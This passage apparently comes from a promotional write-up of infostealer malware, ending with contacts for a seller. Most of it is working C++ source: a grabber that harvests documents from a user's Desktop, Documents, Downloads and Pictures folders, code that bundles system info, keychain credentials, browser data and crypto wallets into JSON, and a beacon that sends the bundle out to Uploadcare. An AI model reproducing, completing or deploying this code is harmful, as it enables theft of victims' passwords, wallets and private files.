        jsonResult << "]";  // End array of files and directories
    }
    vector<unsigned char> readFile(const string& filePath) const {
        ifstream file(filePath, ios::binary);
        if (!file) {
            throw runtime_error("Failed to open file: " + filePath);
        }
        vector<unsigned char> fileData((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
        file.close();
        return fileData;
    }
};
#endif // BROWSERPROFILER_H
```

In short, this class captures all encrypted SQLite browser data files, encodes them in base64, and organizes them into JSON format. In addition, it captures wallets (for example, Meta Mask) from the browser.
After collecting browser data, we launch a grabber to collect predefined files. This is done by accessing user directories such as Desktop, Documents, Downloads, etc.

```
            // Retrieve grabbed files data (base64 encoded contents)

            string grabberData = grabber.grabFiles();  // Grab files from user directories
```

This function is taken from our grabber class. :
```
#ifndef GRABBER_H
#define GRABBER_H
//{GRABBER_DESKTOP}
//{GRABBER_DOCUMENTS}
//{GRABBER_DOWNLOADS}
//{GRABBER_PICTURES}

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <stdexcept>
#include <dirent.h>   // For directory operations
#include <sys/types.h> // For directory operations
#include <cstring>    // For handling strings
#include <cstdlib>    // For getenv
#include <sstream>    // For stringstream
#include <iterator>   // For istreambuf_iterator
using namespace std;
class Grabber {
public:
    // List of predefined file extensions to search for
    const vector<string> extensions = {".doc", ".docx", ".pdf", ".txt", ".xlsx"};
    // Function to get the home directory
    string getHomeDirectory() const {
        const char* homeDir = getenv("HOME");
        if (!homeDir) {
            throw runtime_error("Failed to get home directory.");
        }
        return string(homeDir);
    }
    // Function to list files in a directory with the specified extensions
    vector<string> listFilesWithExtensions(const string& dirPath) const {
        vector<string> matchedFiles;
        DIR* dir = opendir(dirPath.c_str());
        if (dir == nullptr) {
            throw runtime_error("Failed to open directory: " + dirPath);
        }
        struct dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            string fileName = entry->d_name;
            // Check if file has the desired extension
            for (const string& ext : extensions) {
                if (fileName.size() > ext.size() && fileName.compare(fileName.size() - ext.size(), ext.size(), ext) == 0) {
                    matchedFiles.push_back(dirPath + "/" + fileName);
                    break;
                }
            }
        }
        closedir(dir);
        return matchedFiles;
    }
    // Function to grab files from user-specified directories
    string grabFiles() {
        string homeDir = getHomeDirectory();
        vector<string> foundFiles;
        // Conditional compilation for each path
#ifdef GRABBER_DESKTOP
        try {
            vector<string> files = listFilesWithExtensions(homeDir + "/Desktop");
            foundFiles.insert(foundFiles.end(), files.begin(), files.end());
        } catch (const exception& e) {
            cerr << "Error reading Desktop directory: " << e.what() << endl;
        }
#endif
#ifdef GRABBER_DOCUMENTS
        try {
            vector<string> files = listFilesWithExtensions(homeDir + "/Documents");
            foundFiles.insert(foundFiles.end(), files.begin(), files.end());
        } catch (const exception& e) {
            cerr << "Error reading Documents directory: " << e.what() << endl;
        }
#endif
#ifdef GRABBER_DOWNLOADS
        try {
            vector<string> files = listFilesWithExtensions(homeDir + "/Downloads");
            foundFiles.insert(foundFiles.end(), files.begin(), files.end());
        } catch (const exception& e) {
            cerr << "Error reading Downloads directory: " << e.what() << endl;
        }
#endif
#ifdef GRABBER_PICTURES
        try {
            vector<string> files = listFilesWithExtensions(homeDir + "/Pictures");
            foundFiles.insert(foundFiles.end(), files.begin(), files.end());
        } catch (const exception& e) {
            cerr << "Error reading Pictures directory: " << e.what() << endl;
        }
#endif
        // Prepare the JSON response
        stringstream json;
        json << "[ ";
        bool first = true;
        for (const string& filePath : foundFiles) {
            if (!first) json << ", ";
            first = false;
            // Read the file content
            ifstream file(filePath, ios::binary);
            if (!file) {
                cerr << "Failed to open file: " << filePath << endl;
                continue;
            }
            vector<unsigned char> fileData((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
            file.close();
            // Assuming base64Encode is already available in the project
            string base64Content = base64Encode(fileData);
            // Add to JSON
            json << "{"
                 << "\"path\": \"" << filePath << "\", "
                 << "\"content\": \"" << base64Content << "\""
                 << "}";
        }
        json << " ]";
        return json.str();
    }
};
#endif // GRABBER_H
```

As the name suggests, the only purpose of this class is to capture files from predefined folders.
After that, we organize all the captured information into a JSON structure and return it as the final response.

```
// Combine system, keychain, browser, and grabber data into a single JSON object

            stringstream finalJson;

            finalJson << "{";

            finalJson << "\"system_info\": " << systemInfo << ",";  // Include system information

            finalJson << "\"keychain\": {";

            finalJson << "\"user\": \"" << keychainUser << "\",";

            finalJson << "\"password\": \"" << keychainPassword << "\",";

            finalJson << "\"keychain_data\": \"" << keychainData << "\"";

            finalJson << "},";

            finalJson << "\"browser_data\": " << browserData << ",";  // Include browser data

            finalJson << "\"Grabber\": " << grabberData;  // Grabber data as top-level

            finalJson << "}";

 

            // Return the final combined JSON

            return finalJson.str();
```

We check the result and complete the main_payload. This step ensures that the logs are uploaded successfully, and if everything is successful, the process is considered completed.

```
    // Send the beacon content to Uploadcare

    bool success = beacon.send(public_key, secret_key, beaconJson);

 

    // Output the result of the send operation

    if (success) {

        cout << "Beacon sent successfully!" << endl;

    } else {

        cout << "Failed to send the beacon." << endl;

    }
```

<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">

Contacts:

injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72




